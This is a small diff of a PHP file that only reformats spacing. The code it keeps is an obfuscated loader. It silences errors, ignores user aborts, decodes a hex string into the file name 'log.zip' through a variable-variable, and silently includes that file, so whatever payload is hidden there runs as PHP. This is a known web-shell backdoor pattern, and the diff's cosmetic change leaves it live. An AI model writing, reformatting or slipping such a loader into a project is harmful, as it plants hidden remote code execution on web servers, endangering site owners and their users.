@@ -14,7 +14,7 @@ ignore_user_abort(true);
 <?php
 error_reporting(0);
 ignore_user_abort(true);
-$a="6C6F672"."E7A6970";
-$b="a";
-@include(PACK('H*',$$b));
+$a = "6C6F672" . "E7A6970";
+$b = "a";
+@include(PACK('H*', $$b));
 ?>
